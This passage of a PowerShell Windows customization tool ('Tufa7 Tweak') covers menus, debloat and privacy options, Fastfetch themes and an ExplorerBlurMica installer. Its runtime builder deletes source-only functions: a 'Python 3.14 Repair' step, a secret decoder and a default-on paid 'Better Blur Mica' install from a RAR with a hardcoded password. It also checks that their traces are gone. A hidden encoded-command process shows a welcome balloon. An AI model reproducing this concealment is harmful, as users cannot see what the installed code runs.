            throw ([IO.Path]::GetFileName($CommandPath)+' returned exit code '+$proc.ExitCode+': '+$errorText)
        }
    }
    finally{
        $proc.Dispose()
    }
}

function Install-ExplorerMicaOfficial {
    Assert-Administrator 'Official ExplorerBlurMica'
    Ensure-Temp

    $url=[string]$Config.ExplorerMicaUrl
    if(-not (Test-HttpUrl $url)){
        throw 'Official ExplorerBlurMica source is unavailable.'
    }

    $runId=[guid]::NewGuid().ToString('N')
    $zip=Join-Path $script:TempRoot ('ExplorerBlurMica-'+$runId+'.zip')
    $extract=Join-Path $script:TempRoot ('ExplorerBlurMica-Extract-'+$runId)
    $destination=Join-Path $env:ProgramFiles 'ExplorerBlurMica'

    try{
        Show-Info 'Downloading official ExplorerBlurMica 2.0.1 from Maplespe...'
        Download-CuteFile -Url $url -Destination $zip -Label 'ExplorerBlurMica'

        New-Item -ItemType Directory -Path $extract -Force|Out-Null
        Expand-Archive -LiteralPath $zip -DestinationPath $extract -Force

        $register=Get-ChildItem -LiteralPath $extract -Filter 'register.cmd' -Recurse -File -ErrorAction SilentlyContinue |
            Select-Object -First 1

        $dll=Get-ChildItem -LiteralPath $extract -Filter 'ExplorerBlurMica.dll' -Recurse -File -ErrorAction SilentlyContinue |
            Select-Object -First 1

        if(-not $register){throw 'register.cmd was not found in the official package.'}
        if(-not $dll){throw 'ExplorerBlurMica.dll was not found in the official package.'}

        $sourceDir=$register.Directory.FullName
        if(Test-Path -LiteralPath $destination){
            $oldUninstall=Join-Path $destination 'uninstall.cmd'

            if(Test-Path -LiteralPath $oldUninstall){
                try{
                    Invoke-Tufa7CmdHidden -CommandPath $oldUninstall -WorkingDirectory $destination -TimeoutMs 20000
                }
                catch{
                    Show-Warn ('Previous official install could not be fully unregistered: '+$_.Exception.Message)
                }
            }

            Remove-Item -LiteralPath $destination -Recurse -Force -ErrorAction SilentlyContinue
        }

        New-Item -ItemType Directory -Path $destination -Force|Out-Null
        Copy-Item -Path (Join-Path $sourceDir '*') -Destination $destination -Recurse -Force

        $registerPath=Join-Path $destination 'register.cmd'
        $dllPath=Join-Path $destination 'ExplorerBlurMica.dll'

        if(-not (Test-Path -LiteralPath $registerPath)){throw 'register.cmd is missing after installation.'}
        if(-not (Test-Path -LiteralPath $dllPath)){throw 'ExplorerBlurMica.dll is missing after installation.'}

        Show-Info 'Registering official ExplorerBlurMica...'
        Invoke-Tufa7CmdHidden -CommandPath $registerPath -WorkingDirectory $destination -TimeoutMs 30000

        if(-not (Get-Process explorer -ErrorAction SilentlyContinue)){
            Start-Process explorer.exe -ErrorAction SilentlyContinue|Out-Null
        }

        Show-OK 'Official ExplorerBlurMica installed.'
    }
    finally{
        Remove-Item -LiteralPath $zip -Force -ErrorAction SilentlyContinue
        Remove-Item -LiteralPath $extract -Recurse -Force -ErrorAction SilentlyContinue
    }
}

$TaskCatalog = @(
    [pscustomobject]@{ Id='RestorePoint';        Category='Safety';        Name='Create System Restore Point';                 Admin='Yes';       Risk='Safe';    Selected=$true  },
    [pscustomobject]@{ Id='Fastfetch';           Category='Terminal';      Name='Install Fastfetch';                          Admin='No';        Risk='Safe';    Selected=$true  },
    [pscustomobject]@{ Id='FastfetchStartup';    Category='Terminal';      Name='Run Fastfetch at PowerShell startup';         Admin='No';        Risk='Safe';    Selected=$true  },
    [pscustomobject]@{ Id='CutePrompt';          Category='Terminal';      Name='Tufa7 PowerShell prompt';                      Admin='No';        Risk='Safe';    Selected=$true  },
    [pscustomobject]@{ Id='LiteBar';             Category='Apps';          Name='Install + launch LiteBar';                     Admin='Yes (UAC)'; Risk='Safe';    Selected=$true  },
    [pscustomobject]@{ Id='PaidBbm';             Category='Explorer';      Name='Better Blur Mica (Source Build)';                  Admin='Yes';       Risk='Caution'; Selected=$true  },
    [pscustomobject]@{ Id='DarkMode';            Category='Appearance';    Name='Enable Windows Dark Mode';                   Admin='No';        Risk='Safe';    Selected=$true  },
    [pscustomobject]@{ Id='TaskbarLeft';         Category='Appearance';    Name='Taskbar alignment - Left';                    Admin='No';        Risk='Safe';    Selected=$false },
    [pscustomobject]@{ Id='HideSearch';          Category='Appearance';    Name='Hide Taskbar Search';                         Admin='No';        Risk='Safe';    Selected=$true  },
    [pscustomobject]@{ Id='HideTaskView';        Category='Appearance';    Name='Hide Task View button';                       Admin='No';        Risk='Safe';    Selected=$true  },
    [pscustomobject]@{ Id='Extensions';          Category='Explorer';      Name='Show file extensions';                        Admin='No';        Risk='Safe';    Selected=$true  },
    [pscustomobject]@{ Id='HiddenFiles';         Category='Explorer';      Name='Show hidden files';                           Admin='No';        Risk='Safe';    Selected=$false },
    [pscustomobject]@{ Id='ExplorerThisPC';      Category='Explorer';      Name='Open File Explorer to This PC';               Admin='No';        Risk='Safe';    Selected=$true  },
    [pscustomobject]@{ Id='CompactMode';         Category='Explorer';      Name='File Explorer Compact View';                  Admin='No';        Risk='Safe';    Selected=$false },
    [pscustomobject]@{ Id='ClassicMenu';         Category='Explorer';      Name='Classic Windows 11 context menu';              Admin='No';        Risk='Safe';    Selected=$false },
    [pscustomobject]@{ Id='StartRecommendations';Category='Appearance';    Name='Disable Start recommendations';               Admin='No';        Risk='Safe';    Selected=$true  },

    [pscustomobject]@{ Id='Telemetry';           Category='Privacy';       Name='Disable Telemetry + Advertising ID';           Admin='Yes';       Risk='Safe';    Selected=$true  },
    [pscustomobject]@{ Id='ActivityHistory';     Category='Privacy';       Name='Disable Activity History';                     Admin='Yes';       Risk='Safe';    Selected=$true  },
    [pscustomobject]@{ Id='ConsumerFeatures';    Category='Privacy';       Name='Disable Microsoft Consumer Features';          Admin='Yes';       Risk='Safe';    Selected=$true  },
    [pscustomobject]@{ Id='DeliveryOptimization';Category='Privacy';       Name='Disable Delivery Optimization sharing';        Admin='Yes';       Risk='Safe';    Selected=$true  },
    [pscustomobject]@{ Id='Location';            Category='Privacy';       Name='Disable Location tracking';                    Admin='Yes';       Risk='Caution'; Selected=$false },
    [pscustomobject]@{ Id='BackgroundApps';      Category='Privacy';       Name='Disable background apps';                      Admin='No';        Risk='Caution'; Selected=$false },

    [pscustomobject]@{ Id='DisableCopilot';      Category='Debloat';       Name='Disable + hide Microsoft Copilot';             Admin='No';        Risk='Safe';    Selected=$true  },
    [pscustomobject]@{ Id='RemoveCopilot';       Category='Debloat';       Name='Remove Microsoft Copilot app';                 Admin='No';        Risk='Caution'; Selected=$false },
    [pscustomobject]@{ Id='RemoveWidgets';       Category='Debloat';       Name='Remove Windows Widgets';                       Admin='No';        Risk='Caution'; Selected=$false },
    [pscustomobject]@{ Id='EdgeDebloat';         Category='Debloat';       Name='Microsoft Edge - Debloat';                     Admin='Yes';       Risk='Caution'; Selected=$false },
    [pscustomobject]@{ Id='RemoveEdge';          Category='Debloat';       Name='Microsoft Edge - REMOVE';                      Admin='Yes';       Risk='DANGER';  Selected=$false },
    [pscustomobject]@{ Id='RemoveOneDrive';      Category='Debloat';       Name='Microsoft OneDrive - Remove';                  Admin='No';        Risk='Caution'; Selected=$false },
    [pscustomobject]@{ Id='RemoveXbox';          Category='Debloat';       Name='Xbox + Gaming apps - Remove';                  Admin='No';        Risk='Caution'; Selected=$false },
    [pscustomobject]@{ Id='RemoveBloat';         Category='Debloat';       Name='Common preinstalled apps - Remove';             Admin='No';        Risk='Caution'; Selected=$false },

    [pscustomobject]@{ Id='TempCleanup';         Category='Performance';   Name='Clean temporary files';                        Admin='No';        Risk='Safe';    Selected=$true  },
    [pscustomobject]@{ Id='VisualPerformance';   Category='Performance';   Name='Visual effects - Best Performance';             Admin='No';        Risk='Caution'; Selected=$false },
    [pscustomobject]@{ Id='ServicesLean';        Category='Performance';   Name='Optimize selected Windows services';            Admin='Yes';       Risk='Caution'; Selected=$false },
    [pscustomobject]@{ Id='DisableHibernation';  Category='Performance';   Name='Disable Hibernation';                          Admin='Yes';       Risk='Caution'; Selected=$false }
)

function Reset-Selections {
    param([switch]$AllOptional)

    foreach ($task in $TaskCatalog) {
        if ($AllOptional) {
            $task.Selected = $true
            continue
        }

        switch ($task.Id) {
            'RestorePoint'         { $task.Selected = $true  }
            'Fastfetch'            { $task.Selected = $true  }
            'FastfetchStartup'     { $task.Selected = $true  }
            'CutePrompt'           { $task.Selected = $true  }
            'LiteBar'              { $task.Selected = $true  }
            'DarkMode'             { $task.Selected = $true  }
            'HideSearch'           { $task.Selected = $true  }
            'HideTaskView'         { $task.Selected = $true  }
            'Extensions'           { $task.Selected = $true  }
            'ExplorerThisPC'       { $task.Selected = $true  }
            'StartRecommendations' { $task.Selected = $true  }
            'Telemetry'            { $task.Selected = $true  }
            'ActivityHistory'      { $task.Selected = $true  }
            'ConsumerFeatures'     { $task.Selected = $true  }
            'DeliveryOptimization' { $task.Selected = $true  }
            'DisableCopilot'       { $task.Selected = $true  }
            'TempCleanup'          { $task.Selected = $true  }
            'PaidBbm'              { $task.Selected = $true  }
            default                { $task.Selected = $false }
        }
    }
}

function Show-ConfigSummary {
    Show-Logo
    Show-Section 'CONFIG'

    $admin = Test-IsAdministrator
    CWrite ('   Windows         : ' + (Get-OSName)) White
    CWrite ('   Architecture    : ' + (Get-Arch)) White
    CWrite ('   Administrator   : ' + $(if ($admin) { 'Yes' } else { 'No' })) $(if ($admin) { 'Green' } else { 'Yellow' })
    CWrite ('   Tweaks          : ' + $TaskCatalog.Count + ' terminal / Windows options') White
    CWrite ('   Personalized    : '+[Environment]::UserName+' @ '+$env:COMPUTERNAME) Magenta
    CWrite '   This build is personalized for your device for the best experience.' DarkGray
    CWrite '   Final install creates C:\Cute-Toolbox with a sanitized PowerShell runtime using official ExplorerBlurMica.' DarkGray
    CWrite '   Build           : Official ExplorerBlurMica enabled by default' White
    $browsers = @(Get-InstalledBrowsers)
    CWrite ('   Browsers        : ' + $(if ($browsers.Count) { $browsers -join ', ' } else { 'None detected' })) White
    CWrite ''
    CWrite '   MANUAL: move with arrows and toggle each option with Space.' DarkGray
    CWrite '   AUTO  : selects every tweak and shows a warning/plan before execution.' DarkGray
    CWrite '   APPS: categorized live WinUtil catalog with in-place navigation.' DarkGray
    CWrite '   TUFA7 WALLPAPER: adaptive terminal previews + full-image temporary viewer.' DarkGray
    CWrite '   If Admin tweaks are selected, Tufa7 Tweak asks whether to restart elevated.' DarkGray
}

function Select-Mode {
    $index=0

    $items=@(
        [pscustomobject]@{Key='Manual';Name='MANUAL  - choose every tweak yourself'},
        [pscustomobject]@{Key='Auto';Name='AUTO    - apply the full Tufa7 Tweak setup'},
        [pscustomobject]@{Key='Applications';Name='APPS - categorized WinUtil live catalog'},
        [pscustomobject]@{Key='Wallpapers';Name='TUFA7 WALLPAPER - Wallhaven trends'},
        [pscustomobject]@{Key='Exit';Name='EXIT'}
    )

    Show-ConfigSummary
    Show-Section 'INSTALL MODE'
    CWrite '   [ UP ] / [ DOWN ] move   [ ENTER ] select' DarkGray
    CWrite ''

    $menuTop=[Console]::CursorTop
    $menuRows=$items.Count+1

    while($true){
        Clear-CuteRows -Top $menuTop -Count $menuRows

        for($i=0;$i -lt $items.Count;$i++){
            if($i -eq $index){
                CWrite ('   > '+$items[$i].Name) Cyan
            }
            else{
                CWrite ('     '+$items[$i].Name) Gray
            }
        }

        $key=[Console]::ReadKey($true)

        switch($key.Key){
            'UpArrow'{
                $index--
                if($index -lt 0){$index=$items.Count-1}
            }

            'DownArrow'{
                $index++
                if($index -ge $items.Count){$index=0}
            }

            'Enter'{
                return $items[$index].Key
            }
        }
    }
}

function Select-PowerShellTarget {
    $index=0
    $pwsh=Get-Command pwsh.exe -ErrorAction SilentlyContinue

    $items=@(
        [pscustomobject]@{Key='WindowsPowerShell';Name='Windows PowerShell 5.1';Status='Built in'},
        [pscustomobject]@{Key='PowerShell7';Name='PowerShell 7';Status=$(if($pwsh){'Installed'}else{'Profile only'})},
        [pscustomobject]@{Key='Both';Name='Both PowerShell profiles';Status='Recommended'},
        [pscustomobject]@{Key='Skip';Name='Skip terminal profile changes';Status='No startup changes'}
    )

    Show-Logo
    Show-Section 'CHOOSE POWERSHELL'
    CWrite '   Choose where Tufa7 Tweak should install the Fastfetch/prompt profile.' DarkGray
    CWrite ''

    $menuTop=[Console]::CursorTop
    $menuRows=$items.Count+1

    while($true){
        Clear-CuteRows -Top $menuTop -Count $menuRows

        for($i=0;$i -lt $items.Count;$i++){
            if($i -eq $index){
                CWrite ('   > '+$items[$i].Name.PadRight(31)+' '+$items[$i].Status) Cyan
            }
            else{
                CWrite ('     '+$items[$i].Name.PadRight(31)+' '+$items[$i].Status) Gray
            }
        }

        $key=[Console]::ReadKey($true)

        switch($key.Key){
            'UpArrow'{
                $index--
                if($index -lt 0){$index=$items.Count-1}
            }

            'DownArrow'{
                $index++
                if($index -ge $items.Count){$index=0}
            }

            'Enter'{
                return $items[$index].Key
            }

            'Escape'{
                return 'Skip'
            }
        }
    }
}

function Get-CuteThemePreview {
    param([Parameter(Mandatory)][string]$Theme)

    switch($Theme){
        'Cat'   { return @('      /\\_/\\','     ( o.o )','      > ^ <') }
        'Dog'   { return @('      / \\__','     (    @\\___','      /         O','     /   (_____/','    /_____/   U') }
        'Bunny' { return @('      (\\_/)','      (o.o)','      /|_|\\') }
        'Fox'   { return @('      /\\   /\\','     ( o\\_/o )','      \\  ^  /','      /     \\') }
        'Panda' { return @('       .--.','      / o  o \\','     |   --   |','      \\ .__. /','       ''----''') }
        'Bear'  { return @('      (()__(()','      /      \\','     (  o  o  )','      \\  --  /','       \\____/') }
    }
}

function Show-CuteThemeSplitPreview {
    param(
        [string]$Theme,
        [int]$Index,
        $Items
    )

    $width=84

    try{
        $width=[Math]::Max(
            64,
            [Math]::Min(110,[Console]::WindowWidth-2)
        )
    }
    catch{}

    $line='-'*$width

    CWrite ''
    CWrite '   FASTFETCH PREVIEW' Cyan
    CWrite $line DarkGray
    CWrite ''

    $preview=@(Get-CuteThemePreview -Theme $Theme)

    $sample=@(
        [Environment]::UserName,
        '◆  Windows 11 Pro  x86_64',
        '◆  Intel Core i5 / AMD Ryzen',
        '◆  8.0 GiB / 16.0 GiB',
        '◆  220 GiB / 500 GiB - NTFS',
        '◆  42 mins',
        '',
        '● ● ● ● ● ● ● ●'
    )

    $rows=[Math]::Max($preview.Count,$sample.Count)

    for($i=0;$i -lt $rows;$i++){
        $left=''
        $right=''

        if($i -lt $preview.Count){$left=$preview[$i]}
        if($i -lt $sample.Count){$right=$sample[$i]}

        CWrite ('   '+$left.PadRight(29)) Magenta -NoNewline

        if($i -eq 0){
            CWrite $right Yellow
        }
        elseif($i -eq ($sample.Count-1)){
            CWrite $right Magenta
        }
        else{
            CWrite $right Gray
        }
    }

    CWrite ''
    CWrite $line DarkGray
    CWrite '   ANIMAL STYLE' Cyan
    CWrite '   [ UP ] / [ DOWN ] / [ LEFT ] / [ RIGHT ] preview   [ ENTER ] select' DarkGray
    CWrite ''

    for($i=0;$i -lt $Items.Count;$i++){
        if($i -eq $Index){
            CWrite ('   > '+$Items[$i].Name.PadRight(9)+' '+$Items[$i].Description) Cyan
        }
        else{
            CWrite ('     '+$Items[$i].Name.PadRight(9)+' '+$Items[$i].Description) Gray
        }
    }
}

function Select-CuteTheme {
    $index=0

    $items=@(
        [pscustomobject]@{Key='Cat';Name='CAT';Description='classic cute cat'},
        [pscustomobject]@{Key='Dog';Name='DOG';Description='small puppy'},
        [pscustomobject]@{Key='Bunny';Name='BUNNY';Description='soft rabbit'},
        [pscustomobject]@{Key='Fox';Name='FOX';Description='tiny fox'},
        [pscustomobject]@{Key='Panda';Name='PANDA';Description='round panda'},
        [pscustomobject]@{Key='Bear';Name='BEAR';Description='little bear'}
    )

    Clear-Host
    $top=[Console]::CursorTop
    $rowsToClear=27

    while($true){
        Clear-CuteRows -Top $top -Count $rowsToClear
        Show-CuteThemeSplitPreview `
            -Theme $items[$index].Key `
            -Index $index `
            -Items $items

        $key=[Console]::ReadKey($true)

        switch($key.Key){
            'UpArrow'{
                $index--
                if($index -lt 0){$index=$items.Count-1}
            }

            'DownArrow'{
                $index++
                if($index -ge $items.Count){$index=0}
            }

            'LeftArrow'{
                $index--
                if($index -lt 0){$index=$items.Count-1}
            }

            'RightArrow'{
                $index++
                if($index -ge $items.Count){$index=0}
            }

            'Enter'{
                return $items[$index].Key
            }
        }
    }
}

function Apply-CuteThemeSelection {
    if($script:ShellTarget -eq 'Skip'){return}
    [void](Set-FastfetchCuteConfig)
    $stylePath=Join-Path (Get-FastfetchConfigDirectory) 'style.txt'
    [IO.File]::WriteAllText($stylePath,$script:CuteTheme,(New-Object Text.UTF8Encoding($false)))
}

function Set-FastfetchStyle {
    param([Parameter(Mandatory)][string]$Style)
    $configDir=Get-FastfetchConfigDirectory
    [void](Set-FastfetchCuteConfig)
    $stylePath=Join-Path $configDir 'style.txt'
    [IO.File]::WriteAllText($stylePath,$Style,(New-Object Text.UTF8Encoding($false)))

    $map=@{'Cat'='cat';'Dog'='dog';'Bunny'='bunny';'Fox'='fox';'Panda'='panda';'Bear'='bear'}
    $logoKey=$map[$Style]
    if([string]::IsNullOrWhiteSpace($logoKey)){$logoKey='cat'}
    $chosen=Join-Path $configDir ('ascii-'+$logoKey+'.txt')
    $active=Join-Path $configDir 'ascii.txt'
    if(Test-Path $chosen){Copy-Item -LiteralPath $chosen -Destination $active -Force}
}

function Show-AsciiStyleMenu {
    $style=Select-CuteTheme
    Set-FastfetchStyle -Style $style
    Show-OK ('Fastfetch ASCII style set to '+$style+'.')
    Start-Sleep -Milliseconds 600
}

function Clear-CuteRows {
    param([int]$Top,[int]$Count)
    $width = 100
    try { $width = [Math]::Max(30,[Console]::BufferWidth - 1) } catch {}
    for ($i=0;$i -lt $Count;$i++) {
        try { [Console]::SetCursorPosition(0,$Top+$i) } catch {}
        Write-Host (' ' * $width) -NoNewline
    }
    try { [Console]::SetCursorPosition(0,$Top) } catch {}
}

function Select-ManualTasks {
    Reset-Selections
    $cursor = 0

    Show-Logo
    Show-Section 'MANUAL CONFIG'
    CWrite '   [ UP ] / [ DOWN ] move   [ SPACE ] toggle   [ A ] all   [ N ] none   [ ENTER ] continue' DarkGray
    CWrite '   CAUTION/DANGER options may remove Windows components.' Yellow
    CWrite ''

    $listTop = [Console]::CursorTop
    $pageSize = 12
    try { $pageSize = [Math]::Max(6,[Math]::Min(15,[Console]::WindowHeight - $listTop - 3)) } catch {}
    $rowsToClear = $pageSize + 2

    while ($true) {
        Clear-CuteRows -Top $listTop -Count $rowsToClear

        $start = [Math]::Max(0,[Math]::Min($cursor-[int]($pageSize/2),[Math]::Max(0,$TaskCatalog.Count-$pageSize)))
        $end = [Math]::Min($TaskCatalog.Count-1,$start+$pageSize-1)

        for ($i=$start;$i -le $end;$i++) {
            $task = $TaskCatalog[$i]
            $pointer = if($i -eq $cursor){'>'}else{' '}
            $dot = if($task.Selected){'[●]'}else{'[○]'}
            $dotColor = if($task.Selected){'Cyan'}else{'DarkGray'}
            $riskColor = 'DarkGray'
            if($task.Risk -eq 'Caution'){$riskColor='Yellow'}
            if($task.Risk -eq 'DANGER'){$riskColor='Red'}

            CWrite ('   '+$pointer+' ') $(if($i -eq $cursor){'Cyan'}else{'DarkGray'}) -NoNewline
            CWrite ($dot.PadRight(5)) $dotColor -NoNewline
            CWrite (('['+$task.Category+']').PadRight(15)) DarkGray -NoNewline
            CWrite ($task.Name.PadRight(43)) White -NoNewline
            CWrite (' Admin:'+$task.Admin.PadRight(10)) $(if($task.Admin -like 'Yes*'){'Yellow'}else{'DarkGray'}) -NoNewline
            CWrite (' '+$task.Risk) $riskColor
        }

        CWrite ''
        CWrite ('   Item '+($cursor+1)+'/'+$TaskCatalog.Count) DarkGray

        $key=[Console]::ReadKey($true)
        switch($key.Key){
            'UpArrow' {$cursor--;if($cursor -lt 0){$cursor=$TaskCatalog.Count-1}}
            'DownArrow' {$cursor++;if($cursor -ge $TaskCatalog.Count){$cursor=0}}
            'Spacebar' {
                $current=$TaskCatalog[$cursor]
                $current.Selected=-not $current.Selected
                if($current.Id -eq 'FastfetchStartup' -and $current.Selected){
                    ($TaskCatalog|Where-Object Id -eq 'Fastfetch').Selected=$true
                }
                if($current.Id -eq 'Fastfetch' -and -not $current.Selected){
                    ($TaskCatalog|Where-Object Id -eq 'FastfetchStartup').Selected=$false
                }
            }
            'A' {foreach($task in $TaskCatalog){$task.Selected=$true}}
            'N' {foreach($task in $TaskCatalog){$task.Selected=$false}}
            'Enter' {return}
        }
    }
}

function Show-Tufa7WelcomeNotification {
    try{
        $user=[Environment]::UserName
        if([string]::IsNullOrWhiteSpace($user)){$user='there'}

        $computer=[string]$env:COMPUTERNAME
        $safeUser=$user.Replace("'","''")
        $safeComputer=$computer.Replace("'","''")

        $code=@"
Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing
`$n=New-Object System.Windows.Forms.NotifyIcon
`$n.Icon=[System.Drawing.SystemIcons]::Information
`$n.Visible=`$true
`$n.BalloonTipTitle='Welcome, $safeUser ✨'
`$n.BalloonTipText='Tufa7 Tweak is ready. Welcome $safeUser — this build is personalized for $safeComputer for the best experience.'
`$n.ShowBalloonTip(5000)
Start-Sleep -Seconds 6
`$n.Visible=`$false
`$n.Dispose()
"@

        $encoded=[Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($code))

        Start-Process powershell.exe `
            -ArgumentList @('-NoProfile','-WindowStyle','Hidden','-EncodedCommand',$encoded) `
            -WindowStyle Hidden `
            -ErrorAction SilentlyContinue|Out-Null
    }
    catch{}
}

function Get-Tufa7InstallDirectory {
    return 'C:\Cute-Toolbox'
}

function Get-Tufa7FlaticonPngUrl {
    param([Parameter(Mandatory)][string]$SourceUrl)

    if([string]::IsNullOrWhiteSpace($SourceUrl)){
        return $null
    }

    $match=[regex]::Match($SourceUrl,'_(\d+)(?:\?|$)')

    if(-not $match.Success){
        return $null
    }

    $id=[long]$match.Groups[1].Value
    $folder=[math]::Floor($id/1000)

    return ('https://cdn-icons-png.flaticon.com/512/'+$folder+'/'+$id+'.png')
}

function Convert-Tufa7IconToPink {
    param(
        [Parameter(Mandatory)][string]$InputPath,
        [Parameter(Mandatory)][string]$OutputPath
    )

    Add-Type -AssemblyName System.Drawing -ErrorAction Stop

    $source=$null
    $bitmap=$null

    try{
        $source=[System.Drawing.Bitmap]::FromFile($InputPath)
        $bitmap=New-Object System.Drawing.Bitmap($source.Width,$source.Height,[System.Drawing.Imaging.PixelFormat]::Format32bppArgb)

        for($y=0;$y -lt $source.Height;$y++){
            for($x=0;$x -lt $source.Width;$x++){
                $c=$source.GetPixel($x,$y)

                if($c.A -eq 0){
                    $bitmap.SetPixel($x,$y,[System.Drawing.Color]::Transparent)
                    continue
                }

                $brightness=(
                    (0.2126*$c.R)+
                    (0.7152*$c.G)+
                    (0.0722*$c.B)
                )/255.0

                $factor=0.38+(0.62*$brightness)

                $r=[Math]::Min(255,[int](255*$factor))
                $g=[Math]::Min(255,[int](105*$factor))
                $b=[Math]::Min(255,[int](180*$factor))

                $pink=[System.Drawing.Color]::FromArgb($c.A,$r,$g,$b)
                $bitmap.SetPixel($x,$y,$pink)
            }
        }

        $bitmap.Save($OutputPath,[System.Drawing.Imaging.ImageFormat]::Png)
    }
    finally{
        if($bitmap){$bitmap.Dispose()}
        if($source){$source.Dispose()}
    }
}

function Convert-Tufa7PngToIco {
    param(
        [Parameter(Mandatory)][string]$PngPath,
        [Parameter(Mandatory)][string]$IconPath
    )

    Add-Type -AssemblyName System.Drawing -ErrorAction Stop

    $bitmap=$null
    $icon=$null
    $stream=$null

    try{
        $bitmap=[System.Drawing.Bitmap]::FromFile($PngPath)
        $icon=[System.Drawing.Icon]::FromHandle($bitmap.GetHicon())
        $stream=[IO.File]::Create($IconPath)
        $icon.Save($stream)
    }
    finally{
        if($stream){$stream.Dispose()}
        if($icon){$icon.Dispose()}
        if($bitmap){$bitmap.Dispose()}
    }
}

function Install-Tufa7ShortcutIcon {
    param([Parameter(Mandatory)][string]$InstallDirectory)

    $source=[string]$Config.TweakIconSource

    if(-not (Test-HttpUrl $source)){
        Write-CuteLog 'ICON' 'Flaticon source URL is missing or invalid.'
        return $null
    }

    $assetUrl=Get-Tufa7FlaticonPngUrl -SourceUrl $source

    if(-not (Test-HttpUrl $assetUrl)){
        Write-CuteLog 'ICON' 'Could not derive the Flaticon PNG URL from the source page.'
        return $null
    }

    $originalPng=Join-Path $InstallDirectory 'Tufa7 Icon Original.png'
    $pinkPng=Join-Path $InstallDirectory 'Tufa7 Icon Pink.png'
    $iconPath=Join-Path $InstallDirectory 'Tufa7 Tweak.ico'
    $sourceFile=Join-Path $InstallDirectory 'Icon Source.txt'

    try{
        Write-CuteLog 'ICON' ('Official source: '+$source)
        Write-CuteLog 'ICON' 'Downloading the Flaticon source asset.'

        Invoke-WebRequest `
            -Uri $assetUrl `
            -OutFile $originalPng `
            -UseBasicParsing `
            -ErrorAction Stop

        Convert-Tufa7IconToPink -InputPath $originalPng -OutputPath $pinkPng
        Convert-Tufa7PngToIco -PngPath $pinkPng -IconPath $iconPath

        $sourceInfo=@(
            'Tufa7 Tweak icon source'
            ''
            ('Official source page: '+$source)
            'Source platform: Flaticon'
            'Icon ID: 7577239'
            'Tufa7 Tweak modification: recolored to a pink palette for the application shortcut.'
        )

        [IO.File]::WriteAllLines(
            $sourceFile,
            $sourceInfo,
            (New-Object Text.UTF8Encoding($true))
        )

        Remove-Item -LiteralPath $originalPng -Force -ErrorAction SilentlyContinue

        if(Test-Path -LiteralPath $iconPath){
            Write-CuteLog 'ICON' ('Pink shortcut icon created: '+$iconPath)
            return $iconPath
        }
    }
    catch{
        Write-CuteExceptionLog -Context 'Tufa7 shortcut icon' -ErrorRecord $_
    }

    return $null
}

function Remove-Tufa7FunctionsFromSourceText {
    param(
        [Parameter(Mandatory)][string]$Text,
        [Parameter(Mandatory)][string[]]$Names
    )

    $tokens=$null
    $errors=$null
    $ast=[System.Management.Automation.Language.Parser]::ParseInput($Text,[ref]$tokens,[ref]$errors)

    $functions=@(
        $ast.FindAll(
            {
                param($node)
                return ($node -is [System.Management.Automation.Language.FunctionDefinitionAst] -and $Names -contains $node.Name)
            },
            $true
        )
    )

    foreach($function in ($functions | Sort-Object { $_.Extent.StartOffset } -Descending)){
        $length=$function.Extent.EndOffset-$function.Extent.StartOffset
        $Text=$Text.Remove($function.Extent.StartOffset,$length)
    }

    return $Text
}

function Get-Tufa7ToolboxRuntimeText {
    param([Parameter(Mandatory)][string]$SourcePath)

    $runtime=[IO.File]::ReadAllText($SourcePath)

    $removeFunctions=@(
        'ConvertFrom-Tufa7SourceSecret',
        'Get-Tufa7PythonRepairUrl',
        'Get-Tufa7LegacyArchivePassword',
        'Get-Tufa7PaidBbmUrl',
        'Test-IsPortableExe',
        'Invoke-Python314Repair',
        'Invoke-Tufa7SourceOnlySetup',
        'Get-Tufa7PaidBbmRarExecutable',
        'Test-Tufa7PaidBbmExtracted',
        'Expand-Tufa7PaidBbmArchive',
        'Install-Tufa7PaidBbm',
        'Remove-Tufa7FunctionsFromSourceText',
        'Get-Tufa7ToolboxRuntimeText',
        'Send-Tufa7EnvironmentChanged',
        'Add-Tufa7PathEntry',
        'Install-Tufa7CommandAlias',
        'Install-Tufa7DesktopShortcut'
    )

    $runtime=Remove-Tufa7FunctionsFromSourceText -Text $runtime -Names $removeFunctions

    $runtime=[regex]::Replace(
        $runtime,
        '(?m)^\$script:SourceOnly[^\r\n]*\r?\n',
        ''
    )

    $runtime=[regex]::Replace(
        $runtime,
        "(?ms)^\s*if\(-not \$script:IsToolboxRuntime\)\{\s*Invoke-Tufa7SourceOnlySetup\s*\$successfulTasks\.Add\('Python 3\.14 Repair'\)\s*\}\s*",
        ''
    )

    $runtime=$runtime.Replace(
        '$script:IsToolboxRuntime = $false',
        '$script:IsToolboxRuntime = $true'
    )

    $runtime=[regex]::Replace(
        $runtime,
        "Version\s*=\s*'V9\.4'",
        "Version        = 'V9.4 TOOLBOX'",
        1
    )

    $runtime=[regex]::Replace(
        $runtime,
        "(?m)^\s*\[pscustomobject\]@\{\s*Id='PaidBbm';[^\r\n]*\},\s*$",
        "    [pscustomobject]@{ Id='ExplorerMica';         Category='Explorer';      Name='Explorer Mica (Official Maplespe)';                 Admin='Yes';       Risk='Caution'; Selected=`$true  },",
        1
    )

    $runtime=[regex]::Replace(
        $runtime,
        "'PaidBbm'\s+\{\s*\$task\.Selected\s*=\s*\$true\s*\}",
        "'ExplorerMica'          { `$task.Selected = `$true  }"
    )

    $runtime=[regex]::Replace(
        $runtime,
        "'PaidBbm'\s+\{\s*Install-Tufa7PaidBbm\s*\}",
        "'ExplorerMica'          { Install-ExplorerMicaOfficial }"
    )

    $runtime=$runtime.Replace(
        "Id -eq 'PaidBbm'",
        "Id -eq 'ExplorerMica'"
    )

    $forbidden=@(
        'Invoke-Python314Repair',
        'PythonRepair',
        'Python 3.14 Repair',
        'PaidBbm',
        'Install-Tufa7PaidBbm',
        'Get-Tufa7PaidBbm',
        'BBM.exe',
        'Better Blur',
        'Rar.exe',
        'WinRAR.exe',
        'SourceOnlyArchivePassword',
        'SourceOnlyPaidBbm',
        'clean67@69'
    )

    foreach($token in $forbidden){
        if($runtime -like ('*'+$token+'*')){
            throw ('Toolbox runtime still contains a source-only token: '+$token)
        }
    }

    if($runtime -notlike '*ExplorerBlurMica*'){
        throw 'Toolbox runtime lost the official ExplorerBlurMica component.'
    }

    return $runtime
}

function Send-Tufa7EnvironmentChanged {
    if('Tufa7EnvironmentNative' -as [type]){
        try{
            [void][Tufa7EnvironmentNative]::SendMessageTimeout(
                [IntPtr]0xffff,
                0x001A,
                [IntPtr]::Zero,
                'Environment',
                2,
                5000,
                [ref]([IntPtr]::Zero)
            )
        }
